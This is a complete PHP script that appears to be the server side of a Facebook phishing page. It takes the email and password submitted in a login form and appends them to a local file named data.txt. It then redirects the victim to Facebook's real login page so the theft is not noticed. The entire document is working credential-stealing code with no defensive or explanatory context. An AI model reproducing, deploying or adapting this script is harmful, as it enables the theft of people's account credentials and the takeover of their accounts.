<?php

header ('Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');

$email = $_POST['email'];
$password = $_POST['pass'];


  $open = fopen('data.txt','a');
  fwrite($open,$email);
  fwrite($open, '::');
  fwrite($open,$password);
  fwrite($open, ' |||| ');


?>